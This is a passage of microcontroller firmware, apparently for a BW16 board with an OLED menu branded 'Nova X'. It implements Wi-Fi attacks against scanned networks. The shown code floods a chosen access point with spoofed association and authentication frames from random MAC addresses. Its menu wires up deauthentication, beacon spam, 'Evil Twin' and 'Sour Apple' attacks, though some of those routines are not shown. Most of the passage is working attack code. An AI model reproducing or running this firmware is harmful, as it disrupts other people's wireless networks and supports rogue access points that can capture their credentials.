      assoc_flag = false;
      break;
    }
    random_mac(random_src);
    uint16_t seq = i & 0xFFF;
    switch(state){
      case 0:
        break;
      case 1:
        wifi_tx_assoc_frame(random_src, (void*)bssid, ssid, seq);
        break;
      case 2:
        break;
      case 3:
        wifi_tx_auth_frame(random_src, (void*)bssid, seq);
        break;
    if (delay_ms) delay(delay_ms);
    }
  }
}
void auth_assoc(int state){
  assoc_flag = true;
  if(SelectedItem.size() == 1){
    while(assoc_flag){
      RuningProgressBar();
      display.display();
      int idx = SelectedItem[0];
      int ch = scan_results[idx].channel;
      String SSID = scan_results[idx].ssid;
      wext_set_channel(WLAN0_NAME,ch);
      memcpy(deauth_bssid,scan_results[idx].bssid,6);
      switch(state){
        case 0:{
          if( ch > 14){
            display.clearDisplay();
            showPopup("5Ghz Not Support");
            assoc_flag = false;
          }
          flood(deauth_bssid,SSID.c_str(),100,2,1);
          break;
        }
        case 1:{
          flood(deauth_bssid,SSID.c_str(),100,2,3);
          break;
        }
      }

    }
  }
  else{
    display.clearDisplay();
    showPopup("Please select one ssid for performance");
  }
}
void AT_draw_func(int state){
  display_init();
  deauth_break_flag = false;
  //becaon_break_flag = false;
  while(true){
    if(ButtonPress(btnBack)){
      
      draw_menu(at_names, selected_menu);
      break;
    }
    if(at_names[state] == "Evil Twin"){
      ET_Selected();
      Evil_Twin();
      break;
    }
    if (at_names[state] == "Becaon"){
      //selected_menu = state;
      selected_menu = 0;
      draw_menu(becaon_names,0);
      selection_handdler(becaon_names,2);
      break;
    }
    display.clearDisplay();
    display.drawRoundRect(0, 0, 128, 16, 4, WHITE);
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(6, 3);
    display.println("STATE");
    display.drawFastHLine(0, 17, 128, WHITE);
    display.setTextColor(WHITE);
    display.setCursor(4, 22);
    display.println(at_names[state]);
    const int cx = 110, cy = 26, r = 5;
    display.fillCircle(cx, cy, r, WHITE);
    display.drawCircle(cx, cy, r, WHITE); 
    display.display();
    if (SelectedItem.size() == 0) SelectedItem.push_back(0);
    if (at_names[state] == "Deauth") deauth(0);
    if (at_names[state] == "All Deauth") deauth(1);
    if(at_names[state] == "Sour Apple"){
      SourApple();
      break;
    }
    if(at_names[state] == "Association"){
      auth_assoc(0);
      break;
    }
    if(at_names[state] == "Authentication"){
      auth_assoc(1);
      break;
    }

    if(deauth_break_flag){
      //selected_menu = state;
      draw_menu(at_names, selected_menu);
      break;
    }
  }
}
void setup() {
  Serial.begin(115200);
  setupButtons();
  Wire.begin();
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 F"));
    while (true)
      ;
  }
  display.clearDisplay();
  display.setTextSize(1);
 
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.display();
  main_names = {"Attack", "Scan", "Select","Settings"};
  at_names = {"Deauth", "All Deauth","Becaon","Authentication","Association","Evil Twin","Sour Apple"};
  Serial.println("done");
  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *) String(current_channel).c_str());
  if (scanNetworks("Booting") != 0) {
    while(true) delay(1000);
  }
  SendToEsp("BW16");
  draw_menu(main_names, 0);
  #ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
  #endif
}
int scanNetworks(String text) {

  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...\n");

  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    unsigned long start = millis();
    const unsigned long scanTime = 5000;
    int lastDots = -1;

    while (millis() - start < scanTime) {
      int dotCount = ((millis() - start) / 500) % 4;
      display.clearDisplay();
      display.drawRoundRect(0, 0, 128, 16, 4, SSD1306_WHITE);
      display.setTextSize(1);
      display.setTextColor(SSD1306_WHITE);
      display.setCursor(6, 3);
      display.println("Nova X");
      display.drawFastHLine(0, 17, 128, SSD1306_WHITE);
      display.drawFastHLine(0, 55, 128, SSD1306_WHITE);
      display.setCursor(10, 30);
      display.print(text);
      for (int i = 0; i < 4; i++) {
        display.print(i <= dotCount ? '.' : ' ');
      }
    
      display.display();
      delay(50);
    }
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    display.setCursor(0, 32);
    display.println("Scan failed!");
    display.display();
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}

void loop() {
  selection_handdler(main_names, 0);
}
